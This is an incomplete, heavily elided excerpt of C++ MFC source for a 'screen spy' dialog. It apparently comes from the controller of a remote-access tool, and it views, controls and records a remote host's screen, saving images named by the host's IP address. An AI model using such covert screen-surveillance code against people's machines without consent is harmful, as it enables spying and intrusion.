...
BOOL CScreenSpyDlg::SnapshotRecord()
{
	...
	CString recordfile;
	if (m_RecordPath.IsEmpty()) return FALSE;

	recordfile.Format("%s%s",m_RecordPath,strFileName);



	if (!file.Open(recordfile, CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}
...
BOOL CScreenSpyDlg::OnInitDialog() 
{
	...
	if (pSysMenu != NULL)
	{
		...
		pSysMenu->AppendMenu(MF_STRING, IDM_SCREEN_RECORD, "录制屏幕(&R)");
...
void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	...
	case IDM_CONTROL:
		{
			...
			if (m_bIsCtrl)
			{
				if (MessageBox("确认要控制主机吗?", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
				{
			//		m_bIsCtrl=MF_UNCHECKED;
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
					pSysMenu->CheckMenuItem(IDM_CONTROL, MF_UNCHECKED);
					m_bIsCtrl=FALSE;
					break;
				}
	...
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SCREEN_RECORD:
		m_bIsScreenRecod = !m_bIsScreenRecod;
		pSysMenu->CheckMenuItem(IDM_SCREEN_RECORD, m_bIsScreenRecod ? MF_CHECKED : MF_UNCHECKED);
		m_RecordPath.Empty();
		if (m_bIsScreenRecod)
		{
			CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
			...
			if(dlg.DoModal () != IDOK)
				break;
			m_RecordPath=dlg.GetPathName();
			*((char*)(StrRChrA(m_RecordPath,0,'\\')+1))=0;
		}
...
void CScreenSpyDlg::OnTimer(UINT_PTR nIDEvent)
{
	...
	case 0:
		...
		BYTE	bToken = COMMAND_SCREEN_CONTINUE;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		if (m_bIsScreenRecod)
		{
			SnapshotRecord();
